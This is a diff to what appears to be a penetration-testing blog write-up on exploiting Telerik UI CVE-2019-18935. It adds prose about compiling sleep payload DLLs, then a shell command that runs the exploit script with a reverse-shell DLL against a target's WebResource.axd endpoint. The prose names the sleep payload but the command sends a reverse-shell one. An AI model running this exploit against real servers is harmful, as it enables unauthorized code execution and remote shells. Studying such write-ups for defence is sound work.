@@ -69,5 +69,17 @@ I used a Windows 11 VM with Visual Studio and .NET Framework SDK installed (both
 
 &nbsp;
 
-<img src="/img/Telerik_RCE/detection_telerik.png" style="width:80%;height:80%;display:block;margin-left:auto;margin-right:auto;" alt="Burp_Detection">
+<img src="/img/Telerik_RCE/payload.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">
 
+&nbsp;
+  
+and I ended up with two different payloads, _sleep-XXXXXXXXXXXXX-amd64.dll_ and _sleep-XXXXXXXXXXXXX-x86.dll_, for both x86 and x64 architectures. Since nowadays the majority of the computers run x64 architectures, I decided to move the amd64 sleep payload to my kali machine with a simple and quick python server and I run the exploit sending the payload as follows:
+  
+ &nbsp; 
+  
+{% highlight shell lineos %}
+python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell-XXXXXXXXXXXXXX-amd64.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
+{% endhighlight %}
+  
+&nbsp;
+  
